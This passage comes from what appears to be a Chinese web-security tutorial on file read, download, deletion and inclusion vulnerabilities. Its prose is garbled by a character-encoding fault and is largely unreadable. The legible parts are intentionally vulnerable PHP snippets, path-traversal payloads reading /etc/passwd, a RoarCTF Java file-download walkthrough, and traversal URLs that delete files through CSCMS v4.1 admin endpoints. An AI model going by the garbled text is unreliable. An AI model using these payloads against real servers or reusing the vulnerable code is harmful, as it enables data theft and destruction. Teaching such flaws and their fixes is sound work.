å½“ä¸çŸ¥é“è·¯å¾„æ˜¯ä»€ä¹ˆçš„æƒ…å†µä¸‹ï¼Œè¿™ä¸ªå¯ä»¥è¯´æ˜¯ä¸€ä¸ªéå¸¸å¥½ç”¨çš„äº†ï¼Œæˆ‘ä»¬åˆ©ç”¨ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´å°†mlocate.dbæ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œåˆ©ç”¨locateå‘½ä»¤å°†æ•°æ®è¾“å‡ºæˆæ–‡ä»¶ï¼Œè¿™é‡Œé¢åŒ…å«äº†å…¨éƒ¨çš„æ–‡ä»¶è·¯å¾„ä¿¡æ¯ã€‚ locate è¯»å–æ–¹æ³• locate mlocate.db admin å¯ä»¥å°†mlocate.dbä¸­åŒ…å«adminå†…å®¹å…¨éƒ¨è¾“å‡ºæ¥ã€‚ åˆ©ç”¨è¿™ä¸ªæ–‡ä»¶å¯ä»¥è·å–åˆ°è¯¥æœåŠ¡å™¨ä»»ä½•æˆ‘ä»¬æƒ³è¦çš„å†…å®¹å¹¶ä¸‹è½½å‡ºæ¥è€Œä¸ç”¨ä¸€ä¸ªä¸€ä¸ªå»çŒœè§£ç›®å½•ï¼Œä½†æ˜¯è¿™ä¸ªæ–‡ä»¶åªæœ‰rootç”¨æˆ·æ‰èƒ½è¯»å–ã€‚å¦ä¸€æ–¹é¢æˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ©ç”¨linuxå†…æ ¸çš„ä¸€ä¸ªæ–‡ä»¶/proc/self/cmdlineå½“å‰è¿›ç¨‹çš„cmdlineå‚æ•°ï¼Œå¯ä»¥è·å–åˆ°è·¯å¾„ä¿¡æ¯ã€‚ æ€»çš„æ¥è¯´ï¼Œä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´çš„åˆ©ç”¨ä¸»è¦æ˜¯ä¸ºäº†ä¿¡æ¯æ”¶é›†ï¼Œæˆ‘ä»¬é€šè¿‡å¯¹æœåŠ¡å™¨é…ç½®æ–‡ä»¶çš„ä¸‹è½½ï¼Œè·å–åˆ°å¤§é‡çš„é…ç½®ä¿¡æ¯ã€æºç ï¼Œä»è€Œæ ¹æ®è·å–çš„ä¿¡æ¯æ¥è¿›ä¸€æ­¥æŒ–æ˜æœåŠ¡å™¨æ¼æ´ä»è€Œå…¥ä¾µã€‚ 6. ä»»æ„æ–‡ä»¶è¯»å–ä¸ä¸‹è½½æ¼æ´éªŒè¯ ä»»æ„æ–‡ä»¶è¯»å–éªŒè¯ ç¤ºä¾‹ä»£ç ï¼š &lt;?php $filename=$_GET['f']; echo file_get_contents($filename); ?&gt; æµ‹è¯•ï¼š readfile.php?f=../../../../../../etc/passwd readfile.php?f=../index.txt file://ä¼ªåè®® ï¼Œè¯»å–æ–‡ä»¶å†…å®¹ readfile.php?f=file:///etc/passwd ä»»æ„æ–‡ä»¶ä¸‹è½½éªŒè¯ ç¤ºä¾‹ä»£ç ï¼š &lt;?php $filename = $_GET['f']; echo '&lt;h1&gt;è®²å¼€å§‹ä¸‹è½½æ–‡ä»¶ï¼&lt;/h1&gt;&lt;br /&gt;&lt;br /&gt;'; echo file_get_contents($filename); header('Content-Type: imgage/jpeg'); header('Content-Disposition: attachment; filename='.$filename); header('Content-Lengh: '.filesize($filename)); ?&gt; å½“ç„¶ï¼Œæˆ‘ä¸‹è½½çš„è¿™ä¸ªæ–‡ä»¶å¹¶æ²¡æœ‰å†…å®¹ã€‚ 7. æ¼æ´åˆ¤æ–­ å‚æ•°fçš„å‚æ•°å€¼ä¸ºPHPæ–‡ä»¶æ—¶ï¼š 1.æ–‡ä»¶è¢«è§£æï¼Œåˆ™æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´ 2.æ˜¾ç¤ºæºä»£ç ï¼Œåˆ™æ˜¯æ–‡ä»¶è¯»å–æ¼æ´ 3.æç¤ºä¸‹è½½ï¼Œåˆ™æ˜¯æ–‡ä»¶ä¸‹è½½æ¼æ´ 8. æ¼æ´åˆ©ç”¨å®æˆ˜ æˆ‘å­¦ä¹ ä»»æ„æ–‡ä»¶è¯»å–ä¸ä¸‹è½½æ¼æ´ï¼Œå°±æ˜¯å› ä¸ºé‡åˆ°äº†ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–ä¸ä¸‹è½½æ¼æ´çš„Webé¢˜ï¼Œæ‰€ä»¥åœ¨æ­¤å®æˆ˜ä¸€ä¸‹ RoarCTF2019-Webï¼šEasy Java(è·Ÿç€å¤ç°å§) ä¸æ˜¯å¼±å£ä»¤ï¼Œä¹Ÿä¸èƒ½æ‰«å‡ºç›®å½•ã€‚åªæœ‰ä¸€ä¸ªhelp.docxæ–‡ä»¶å¯ä»¥ä¸‹è½½ã€‚äºæ˜¯å¯èƒ½æ˜¯ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ã€‚ ç‚¹å‡»è“å­—â€œhelpâ€ï¼ŒæŠ“åŒ…ï¼Œå‘åŒ…ã€‚å‘ç°GETæ–¹å¼ä¸€ç›´ä»€ä¹ˆéƒ½ä¸‹è½½ä¸äº†ã€‚åæ¥ä¿®æ”¹ä¸ºPOSTï¼Œå°±å¯ä»¥ä¸‹è½½äº†ã€‚ æ­¤æ—¶urlï¼šdownloadï¼ŒçŒœæµ‹æ˜¯æ–‡ä»¶ä¸‹è½½æ¼æ´, å¦‚ä¸‹å›¾å‘ç°filenameå‚æ•°å¯æ§ æ²¡å•¥ç”¨, è¡¥å……ä¸€ä¸‹java webçš„ç›®å½•ç»“æ„ æ•æ„Ÿç›®å½• ï¼ˆ1ï¼‰ /WEB-INF/web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚ ï¼ˆ2ï¼‰ /WEB-INF/classes/ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­ ï¼ˆ3ï¼‰ /WEB-INF/lib/ï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶ ï¼ˆ4ï¼‰ /WEB-INF/src/ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ã€‚ ï¼ˆ5ï¼‰/WEB-INF/database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶ WEB-INF/web.xmlæ³„éœ² æ¼æ´æˆå› ï¼šé€šå¸¸ä¸€äº›webåº”ç”¨æˆ‘ä»¬ä¼šä½¿ç”¨å¤šä¸ªwebæœåŠ¡å™¨æ­é…ä½¿ç”¨ï¼Œè§£å†³å…¶ä¸­çš„ä¸€ä¸ªwebæœåŠ¡å™¨çš„æ€§èƒ½ç¼ºé™·ä»¥åŠåšå‡è¡¡è´Ÿè½½çš„ä¼˜ç‚¹å’Œå®Œæˆä¸€äº›åˆ†å±‚ç»“æ„çš„å®‰å…¨ç­–ç•¥ç­‰ã€‚åœ¨ä½¿ç”¨è¿™ç§æ¶æ„çš„æ—¶å€™ï¼Œç”±äºå¯¹é™æ€èµ„æºçš„ç›®å½•æˆ–æ–‡ä»¶çš„æ˜ å°„é…ç½®ä¸å½“ï¼Œå¯èƒ½ä¼šå¼•å‘ä¸€äº›çš„å®‰å…¨é—®é¢˜ï¼Œå¯¼è‡´web.xmlç­‰æ–‡ä»¶èƒ½å¤Ÿè¢«è¯»å–ã€‚ æ¼æ´æ£€æµ‹ä»¥åŠåˆ©ç”¨æ–¹æ³•ï¼šé€šè¿‡æ‰¾åˆ°web.xmlæ–‡ä»¶ï¼Œæ¨æ–­classæ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åç›´æ¥classæ–‡ä»¶ï¼Œåœ¨é€šè¿‡åç¼–è¯‘classæ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç ã€‚ POSTè®¿é—®WEB-INF/web.xml, å‘ç° æ²¡é”™, æå¿ƒæ€çš„ å‚ç…§ä¹‹å‰ï¼Œæƒ³å°è¯•è®¿é—®/WEB-INF/web.xmlå¾—åˆ°æ–‡ä»¶ä½†æ˜¯å¤±è´¥äº†ï¼ŒæŸ¥çœ‹æºç å‘ç°æœ‰ä¸ªåœ°æ–¹æ˜¯è¦æ±‚POSTæ–¹å¼ä¼ å…¥ å‘ç°å¦‚ä¸‹ å‘ç°æ“ä½œflagçš„å…³é”®æ–‡ä»¶ä½ç½®ï¼Œè¯»å–(æˆ–ä¸‹è½½)/WEB-INF/classes/ä¸‹çš„flagçš„å…³é”®æ–‡ä»¶ä½ç½®ï¼Œåˆå› ä¸ºJavaå­—èŠ‚ç ç±»æ–‡ä»¶ï¼ˆ.classï¼‰æ˜¯Javaç¼–è¯‘å™¨ç¼–è¯‘Javaæºæ–‡ä»¶ï¼ˆ.javaï¼‰äº§ç”Ÿçš„â€œç›®æ ‡æ–‡ä»¶â€ã€‚ æœ€ç»ˆå¾—å‡ºflagçš„å…³é”®æ–‡ä»¶ä½ç½®ä¸ºï¼š/WEB-INF/classes/com/wm/ctf/FlagController.class base64è§£ç å³å¯ 9. æ¼æ´é˜²å¾¡ä¿®å¤ é€šç”¨ è¿‡æ»¤ . ç‚¹ï¼Œä½¿ç”¨æˆ·åœ¨urlä¸­ä¸èƒ½å›æº¯ä¸Šçº§ç›®å½• æ­£åˆ™ä¸¥æ ¼åˆ¤æ–­ç”¨æˆ·è¾“å…¥çš„å‚æ•° php.inié…ç½®open_basediré™å®šæ–‡ä»¶è®¿é—®èŒƒå›´ æ–‡ä»¶ä¸‹è½½æ¼æ´ä¿®å¤ å°†ä¸‹è½½åŒºç‹¬ç«‹å‡ºæ¥ï¼Œæ”¾åœ¨é¡¹ç›®è·¯å¾„å¤–ï¼Œç»™æ¯ä¸ªä¸‹è½½èµ„æºå›ºå®šçš„URLï¼Œè€Œä¸æ˜¯æ‰€æœ‰çš„ä¸‹è½½èµ„æºéƒ½æ˜¯ç»Ÿä¸€çš„URLï¼šwww.test.com/download?filename=æ–‡ä»¶å å‡€åŒ–æ•°æ®ï¼šå¯¹ç”¨æˆ·ä¼ è¿‡æ¥çš„æ–‡ä»¶åå‚æ•°è¿›è¡Œç¡¬ç¼–ç æˆ–ç»Ÿä¸€ç¼–ç ï¼Œå¯¹æ–‡ä»¶ç±»å‹è¿›è¡Œç™½åå•æ§åˆ¶ï¼Œå¯¹åŒ…å«æ¶æ„å­—ç¬¦æˆ–è€…ç©ºå­—ç¬¦çš„å‚æ•°è¿›è¡Œæ‹’ç»ã€‚ webåº”ç”¨ç¨‹åºå¯ä»¥ä½¿ç”¨chrootç¯å¢ƒåŒ…å«è¢«è®¿é—®çš„webç›®å½•ï¼Œæˆ–è€…ä½¿ç”¨ç»å¯¹è·¯å¾„+å‚æ•°æ¥è®¿é—®æ–‡ä»¶ç›®å½•æ—¶, ä½¿å…¶å³ä½¿è¶Šæƒä¹Ÿåœ¨è®¿é—®ç›®å½•ä¹‹å†…ã€‚wwwç›®å½•å°±æ˜¯ä¸€ä¸ªchrootåº”ç”¨ã€‚ç”±chrootåˆ›é€ å‡ºçš„é‚£ä¸ªæ ¹ç›®å½•ï¼Œå«åšâ€œchrootç›‘ç‹±â€(æ‰€è°“â€ç›‘ç‹±â€å°±æ˜¯æŒ‡é€šè¿‡chrootæœºåˆ¶æ¥æ›´æ”¹æŸä¸ªè¿›ç¨‹æ‰€èƒ½çœ‹åˆ°çš„æ ¹ç›®å½•ï¼Œå³å°†æŸè¿›ç¨‹é™åˆ¶åœ¨æŒ‡å®šç›®å½•ä¸­ï¼Œä¿è¯è¯¥è¿›ç¨‹åªèƒ½å¯¹è¯¥ç›®å½•åŠå…¶å­ç›®å½•çš„æ–‡ä»¶æœ‰æ‰€åŠ¨ä½œï¼Œä»è€Œä¿è¯æ•´ä¸ªæœåŠ¡å™¨çš„å®‰å…¨ã€‚ è¯¦ç»†å…·ä½“chrootçš„ç”¨æ³•ï¼Œå¯å‚è€ƒï¼šblog.csdn.net/frozen_fish/article/details/2244870 ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ä¹Ÿæœ‰å¯èƒ½æ˜¯webæ‰€é‡‡ç”¨çš„ä¸­é—´ä»¶çš„ç‰ˆæœ¬ä½è€Œå¯¼è‡´é—®é¢˜çš„äº§ç”Ÿï¼Œä¾‹å¦‚ibmçš„websphereçš„ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ï¼Œéœ€æ›´æ–°å…¶ä¸­é—´ä»¶çš„ç‰ˆæœ¬å¯ä¿®å¤ã€‚ è¦ä¸‹è½½çš„æ–‡ä»¶åœ°å€ä¿å­˜è‡³æ•°æ®åº“ä¸­ã€‚ æ–‡ä»¶è·¯å¾„ä¿å­˜è‡³æ•°æ®åº“ï¼Œè®©ç”¨æˆ·æäº¤æ–‡ä»¶å¯¹åº”IDä¸‹è½½æ–‡ä»¶ã€‚ ç”¨æˆ·ä¸‹è½½æ–‡ä»¶ä¹‹å‰éœ€è¦è¿›è¡Œæƒé™åˆ¤æ–­ã€‚ æ–‡ä»¶æ”¾åœ¨webæ— æ³•ç›´æ¥è®¿é—®çš„ç›®å½•ä¸‹ã€‚ ä¸å…è®¸æä¾›ç›®å½•éå†æœåŠ¡ã€‚ å…¬å¼€æ–‡ä»¶å¯æ”¾ç½®åœ¨webåº”ç”¨ç¨‹åºä¸‹è½½ç›®å½•ä¸­é€šè¿‡é“¾æ¥è¿›è¡Œä¸‹è½½ã€‚ è®°å½•æ–‡ä»¶ä¸‹è½½æ—¥å¿—ã€‚ 0x03 æ–‡ä»¶åˆ é™¤ 1.1 æ¼æ´æè¿° â€‹ åº”ç”¨ç¨‹åºåœ¨åˆ é™¤æ–‡ä»¶å‰ï¼Œæœªå¯¹æ‰€è¦åˆ é™¤çš„æ–‡ä»¶å†…å®¹ã€ç±»å‹ã€æ–‡ä»¶åã€æ–‡ä»¶ç›®å½•åšåˆæ³•æ€§æ ¡éªŒï¼Œå¯¼è‡´å¯åˆ é™¤æœåŠ¡å™¨ä¸Šä»»æ„æ–‡ä»¶ï¼Œæ¯”å¦‚åˆ é™¤å®‰è£…ç›®å½•ä¸­é”æ–‡ä»¶ï¼Œç›´æ¥è¿›è¡Œé‡è£…åº”ç”¨ç³»ç»Ÿã€‚ â€‹ æ”»å‡»è€…ä»å¯»æ‰¾ä¸Šåˆ é™¤çš„åŠŸèƒ½ï¼Œæ­£å¸¸åˆ é™¤åŠŸèƒ½çš„æ–‡ä»¶æ²¡æœ‰ç»è¿‡æ ¡éªŒæˆ–è€…ä¸ä¸¥æ ¼ï¼Œæ”»å‡»è€…æ§åˆ¶è¿™ä¸ªå¯æ“ä½œçš„å˜é‡é…åˆç›®å½•éå†è¿›è¡Œåˆ é™¤å…¶ä»–æ–‡ä»¶ã€‚è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªunlink()å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯åˆ é™¤å¯¹åº”çš„æ–‡ä»¶åŠæ–‡ä»¶å†…å®¹ã€‚ 1.2 åº”ç”¨åœºæ™¯ åˆ é™¤æ–‡ä»¶ã€é™„ä»¶ã€å›¾ç‰‡ã€æ›¿æ¢ã€é…ç½®ç­‰ 1.3 æ¼æ´å±å®³ æ”»å‡»è€…åˆ©ç”¨æ­¤æ¼æ´å¯ç›´æ¥åˆ é™¤webç›®å½•ç”šè‡³æœåŠ¡å™¨ä¸Šä»»æ„æ ¼å¼æ–‡ä»¶ï¼Œç›´æ¥å¯¼è‡´ä¸šåŠ¡ç³»ç»Ÿä¸­æ–­ã€å´©æºƒã€‚ 1.4 æ¼æ´å®ä¾‹(ä¸çŸ¥ä¸ºä½•, è¿™ç§æ¼æ´çš„æ–‡ç« å¤ªå°‘äº†, å…ˆè·Ÿç€å¤ç°å§) 1.4.1 ç¯å¢ƒæ­å»º(çœ‹äº†åŠå¤©æ‰å‘ç°, ç°åœ¨çš„æ¼æ´å·²ç»è¢«ä¿®å¤äº†â€¦) å› æ­¤æˆ‘å€Ÿé‰´ä¹‹å‰æœ‰æ¼æ´çš„æƒ…å†µ, æŠŠå…³é”®ä»£ç å†™ä¸Šå»å§ CSCMS ï¼šhttp://www.chshcms.com ç½‘ç«™æºç ç‰ˆæœ¬ï¼šCscms_v4.1æ­£å¼ç‰ˆï¼ˆå‘å¸ƒæ—¥æœŸï¼š2017-06-05ï¼‰ ç¨‹åºæºç ä¸‹è½½ï¼šhttps://github.com/chshcms/cscms æ¼æ´å®ä¾‹ä¸€ æ¼æ´æ–‡ä»¶ä½ç½®ï¼š\\cscms\\plugins\\sys\\admin\\Basedb.php ç¬¬160-177è¡Œï¼š //å¤‡ä»½åˆ é™¤ public function del(){ $dir = str_replace(\"//\",\"/\",str_replace(\"..\",\"\",$this-&gt;input-&gt;get_post('id',true))); //ä¿®å¤å‰ //$dir = $this-&gt;input-&gt;get_post('id', true); if(empty($dir)){ getjson(L('plub_11')); } $dirs = array(); if(!is_array($dir)){ $dirs[] = $dir; }else{ $dirs = $dir; } foreach($dirs as $dir) { deldir(FCPATH.'attachment/backup/'.$dir); } $info['msg'] = L('plub_12'); $info['url'] = site_url('basedb/restore').'?v='.rand(1000,9999); getjson($info,0); } æ¼æ´åˆ©ç”¨ï¼š 1ã€æ ¹ç›®å½•ä¸‹æ–°å»ºtestç›®å½•ä½œä¸ºæµ‹è¯•ï¼š 2ã€æ„é€ å‚æ•°æˆåŠŸåˆ é™¤testç›®å½•(ç¯å¢ƒçœ‹ä¸æ‡‚å’‹æ­å»º, å°±ç®—äº†å§) http://127.0.0.1/admin.php/basedb/del POST:id=..\\\\..\\\\test æ¼æ´å®ä¾‹äºŒ æ¼æ´æ–‡ä»¶ä½ç½®ï¼š/plugins/sys/admin/Skin.php ç¬¬418â€“440è¡Œï¼š //æ–‡ä»¶åˆ é™¤ public function del(){ $ac = $this-&gt;input-&gt;get('ac',true); $op = $this-&gt;input-&gt;get('op',true); $dir = str_replace(\".\",\"\",$this-&gt;input-&gt;get('dirs',true)); $file = str_replace(\"..\",\"\",$this-&gt;input-&gt;get('file')); //ä¿®å¤å‰ //$dir = $this-&gt;input-&gt;get('dirs',true); //$file = $this-&gt;input-&gt;get('file'); if($ac!='mobile') $ac='pc'; if($op!='home' &amp;&amp; $op!='user') $op='skins'; if(empty($dir) || preg_match(\"/^[\\/]{1,}$/i\",$dir)) getjson(L('plub_27')); $skin_dir = VIEWPATH.$ac.FGF.$op.FGF.$dir.FGF.$file; if (!is_dir($skin_dir)) { //æ–‡ä»¶ $res=unlink($skin_dir); }else{ //ç›®å½• $res=deldir($skin_dir); } if($res){ $info['url'] = site_url('skin').'?ac='.$ac.'&amp;op='.$op.'&amp;v='.rand(1000,9999); $info['msg'] = L('plub_46'); $info['turn'] = 1; getjson($info,0); }else{ getjson(L('plub_28')); } } æ¼æ´åˆ©ç”¨ï¼š ç½‘ç«™æ ¹ç›®å½•ä¸‹æ–°å»º1.txtæ–‡ä»¶ä½œä¸ºæµ‹è¯•ï¼Œæ„é€ URLæˆåŠŸåˆ é™¤æ–‡ä»¶ Payloadï¼šhttp://127.0.0.1/admin.php/skin/del?ac=pc&amp;op=skins&amp;dirs=default&amp;file=..\\\\..\\\\..\\\\..\\\\1.txt æ¼æ´å®ä¾‹ä¸‰ æ¼æ´æ–‡ä»¶ä½ç½®ï¼š/plugins/sys/admin/Plugins.php ç¬¬285-299è¡Œï¼š //åˆ é™¤ public function del(){ $dir = $this-&gt;input-&gt;get_post('dir',true); if($dir==''){ getjson(L('plub_del_0'),1); } deldir(FCPATH.'plugins'.FGF.$dir.FGF); //åˆ é™¤é…ç½®ç›®å½• deldir(CSCMS.$dir.FGF); //åˆ é™¤æ¨¡æ¿ç›®å½• deldir(FCPATH.'tpl/admin/'.$dir.FGF); $info['func'] = __FUNCTION__; $info['msg'] = L('plub_del_1'); getjson($info,0); } æ¼æ´åˆ©ç”¨: ?dir=â€¦\\test; è‡ªå·±æ­å»ºä¸€ä¸ª &lt;?php header(\"Content-Type:text/html;charset=utf-8\"); $filename = $_GET['file']; if(file_exists($filename)){ unlink($filename); echo \"&lt;script&gt;alert('åˆ é™¤æˆåŠŸ')&lt;/script&gt;\"; }else{ echo \"&lt;script&gt;alert('åˆ é™¤å¤±è´¥')&lt;/script&gt;\"; } æ‰§è¡ŒæŸ¥è¯¢åï¼Œæ–‡ä»¶è¢«åˆ é™¤æˆåŠŸäº†, ç›®å½•ä¸­æ²¡äº†, å½“ç„¶ä¹Ÿå¯ä»¥éå†ç›®å½•åˆ é™¤ 1.5 ä¿®å¤å»ºè®® é™åˆ¶æ–‡ä»¶åˆ é™¤å‡½æ•°å¯åˆ é™¤çš„ç›®å½•ä½ç½®ã€æ–‡ä»¶ç±»å‹ æ–‡ä»¶åéç”¨æˆ·å¯æ§ 0x04 æ–‡ä»¶åŒ…å« ä¸ºä½•è¦è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Ÿ â€‹ ç¨‹åºå‘˜å†™ç¨‹åºçš„æ—¶å€™ï¼Œä¸å–œæ¬¢å¹²åŒæ ·çš„äº‹æƒ…ï¼Œä¹Ÿä¸å–œæ¬¢æŠŠåŒæ ·çš„ä»£ç ï¼ˆæ¯”å¦‚ä¸€äº›å…¬ç”¨çš„å‡½æ•°ï¼‰å†™å‡ æ¬¡ï¼Œäºæ˜¯å°±æŠŠéœ€è¦å…¬ç”¨çš„ä»£ç å†™åœ¨ä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶é‡Œé¢ï¼Œæ¯”å¦‚ share.phpï¼Œè€Œååœ¨å…¶å®ƒæ–‡ä»¶éœ€è¦ä½¿ç”¨æ—¶è¿›è¡ŒåŒ…å«è°ƒç”¨ã€‚åœ¨phpé‡Œï¼Œæˆ‘ä»¬å°±æ˜¯ä½¿ç”¨ä¸Šé¢åˆ—ä¸¾çš„é‚£å‡ ä¸ªå‡½æ•°æ¥è¾¾åˆ°è¿™ä¸ªç›®çš„çš„ï¼Œå®ƒçš„å·¥ä½œæµç¨‹ï¼šå¦‚æœä½ æƒ³åœ¨ main.phpé‡ŒåŒ…å«share.php,æˆ‘å°†è¿™æ ·å†™ include(â€œshare.phpâ€) ï¼Œç„¶åå°±å¯ä»¥ä½¿ç”¨share.phpä¸­çš„å‡½æ•°äº† æ–‡ä»¶åŒ…å«æ¼æ´æ±‡æ€»: æ–‡ä»¶åŒ…å« å¸¸è§çš„æ–‡ä»¶åŒ…å«å‡½æ•°: PHPï¼šinclude() ã€include_once()ã€require()ã€require_once() JSP/Servletï¼šava.io.file()ã€java.io.filereader() ASPï¼šinclude fileã€include virtual æ–‡ä»¶åŒ…å«å„ä¸ªè„šæœ¬ä»£ç  ASP,PHP,JSP,ASPXç­‰ &lt;! --#include file=â€œ1.aspâ€ --&gt; &lt;c:import url=â€œhttp://thief.one/1.jspâ€&gt; &lt;jsp:include page=â€œhead.jspâ€/&gt; &lt;%@ include file=â€œhead.jspâ€%&gt; &lt;?php Include('test.php')?&gt; â€‹ é»‘ç›’æµ‹è¯•ï¼ˆBlack-box testingï¼‰æ˜¯ä¸€ç§è½¯ä»¶æµ‹è¯•æ–¹æ³•ï¼Œå…¶ä¸­æµ‹è¯•äººå‘˜åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­åªå…³æ³¨è¾“å…¥å’Œè¾“å‡ºï¼Œè€Œå¯¹è¢«æµ‹è¯•ç³»ç»Ÿçš„å†…éƒ¨ç»“æ„å’Œå®ç°ç»†èŠ‚ä¸äº†è§£ã€‚æµ‹è¯•äººå‘˜å°†è½¯ä»¶ç³»ç»Ÿè§†ä¸ºä¸€ä¸ª\"é»‘ç›’å­\"ï¼Œåªèƒ½è§‚å¯Ÿå’Œæµ‹è¯•å…¶åŠŸèƒ½å’Œè¡Œä¸ºï¼Œè€Œä¸äº†è§£å…¶å†…éƒ¨å·¥ä½œåŸç†ã€‚ â€‹ ç®€å•æ¥è¯´, åº”è¯¥è·Ÿç™½åå•ä¸€æ ·, å½“ä½ è¾“å…¥çš„å‚æ•°æ˜¯æ­£ç¡®çš„æˆ–è€…æ˜¯ç³»ç»Ÿè®¤å¯çš„, é‚£ä½ å°±å¯ä»¥æˆåŠŸè¾“å…¥ 1.1æ–‡ä»¶åŒ…å«æ¼æ´çš„åŸç† â€‹ æ–‡ä»¶åŒ…å«æ¼æ´æ˜¯ä¸€ç§å¸¸è§çš„webç±»å‹æ¼æ´,å› ä¸ºå¾ˆå¤šè„šæœ¬è¯­è¨€æ”¯æŒä½¿ç”¨æ–‡ä»¶åŒ…å«,ä¹Ÿå°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œç½‘ç«™å¼€å‘è€…ç»å¸¸ä¼šæŠŠä¸€äº›ä»£ç æ’å…¥åˆ°æŒ‡å®šçš„åœ°æ–¹,ä»è€ŒèŠ‚çœæ—¶é—´é¿å…å†æ¬¡ç¼–å†™ ,è¿™å°±æ˜¯åŒ…å«å‡½æ•°çš„åŸºç¡€è§£é‡Š ,ä½†æ˜¯æˆ‘ä»¬ä¸å…‰å¯ä»¥åŒ…å«æˆ‘ä»¬é¢„å…ˆæŒ‡å®šçš„æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥åŒ…å«æˆ‘ä»¬æœåŠ¡å™¨å†…éƒ¨çš„å…¶ä»–æ–‡ä»¶ï¼Œå‰ææ¡ä»¶å°±æ˜¯æˆ‘ä»¬éœ€è¦æœ‰å¯è¯»çš„æƒé™æ‰èƒ½è¯»å–è¿™äº›æ–‡ä»¶ ,æ‰€ä»¥è¿™æ ·å°±ä¼šå¯¼è‡´æ–‡ä»¶åŒ…å«æ¼æ´ 1.2æ–‡ä»¶åŒ…å«æ¼æ´äº§ç”Ÿçš„åŸå›  â€‹ åœ¨ç½‘ç«™çš„å¼€å‘äººå‘˜åœ¨å¼€å‘ç½‘ç«™çš„æ—¶å€™ï¼Œä¼šæŠŠç»å¸¸é‡å¤ä½¿ç”¨çš„å‡½æ•°æˆ–è€…ç‰¹å®šçš„é¡µé¢å†™åˆ°å•ä¸ªæ–‡ä»¶ä¸­ï¼Œéœ€è¦ä½¿ç”¨çš„æ—¶å€™å°±ç›´æ¥è°ƒç”¨æ­¤æ–‡ä»¶å³å¯ï¼Œè€Œæ— éœ€å†æ¬¡æµªè´¹æ—¶é—´å†æ¬¡ç¼–å†™ï¼Œè¿™ç§æ“ä½œé€šå¸¸è¢«ç§°ä¸ºæ–‡ä»¶åŒ…å«ã€‚ â€‹ å¦‚æœæˆ‘ä»¬æ²¡æœ‰å¯¹æ–‡ä»¶çš„æ¥æºè¿›è¡Œä¸¥æ ¼çš„å®¡æŸ¥ï¼Œä¹Ÿå°±æ˜¯ç¨‹åºå‘˜åœ¨ç¼–å†™ä»£ç çš„æ—¶å€™è§¦çŠ¯çš„é€»è¾‘æ€§çš„é”™è¯¯å°±å¯èƒ½ä¼šå¯¼è‡´æ–‡ä»¶è¯»å–æ¼æ´å’Œå…¶å®ƒç±»å‹çš„æ¼æ´ï¼Œæˆ‘ä»¬å·²phpä¸ºä¾‹ï¼Œåœ¨phpä¸­å¸¸ç”¨çš„æ–‡ä»¶åŒ…å«å‡½æ•°æœ‰ï¼ˆincludeã€requireã€include_onceã€require_onceï¼‰,åç»­ä¼šä»‹ç»å…¶ä¸­çš„åŒºåˆ«ã€‚ 1.2.1 æ— é™åˆ¶&amp;æœ‰é™åˆ¶çš„åŒ…å« æ— é™åˆ¶ä¸ºç›´æ¥ç›´æ¥åŒ…å«æ–‡ä»¶ï¼š &lt;?php $filename=$_GET['filename']; include($filename); ?&gt; æœ‰é™åˆ¶ä¸ºç›´æ¥ç›´æ¥åŒ…å«æ–‡ä»¶ï¼šä»¥æ·»åŠ å›ºå®šåç¼€ä¸ºä¾‹ &lt;?php $filename=$_GET['filename']; include($filename.\".html\"); ?&gt; 1.3æ¼æ´çš„å½¢æˆéœ€è¦çš„æ¡ä»¶ 1ã€`include()`ç­‰å‡½æ•°é€šè¿‡`åŠ¨æ€å˜é‡çš„æ–¹å¼`å¼•å…¥éœ€è¦åŒ…å«çš„æ–‡ä»¶ï¼› 2ã€`ç”¨æˆ·èƒ½å¤Ÿæ§åˆ¶`è¿™ä¸ªåŠ¨æ€å˜é‡ï¼› æ³¨ï¼šä¸€èˆ¬æ¥è¯´æœåŠ¡ç«¯é€šè¿‡`GET`å’Œ`POST`ä¸¤ç§è¯·æ±‚æ–¹å¼æ¥ä¼ é€’éœ€è¦åŒ…å«çš„æ–‡ä»¶çš„è¯å°±æ˜¯ç”¨æˆ·å¯æ§çš„ã€‚ 1.3æ–‡ä»¶åŒ…å«æ¼æ´å®ä¾‹ â€‹ Apace solræ˜¯apacheå…¬å¸ç ”å‘çš„ä¸€æ¬¾å¼€æºçš„æœç´¢æœåŠ¡,åº”ç”¨èŒƒå›´å¾ˆå¹¿,è€Œä¸”åº”ç”¨çš„äººç¾¤ä¹Ÿæ˜¯å¾ˆå¹¿çš„ï¼Œä½†æ˜¯åœ¨è¿‘å‡ 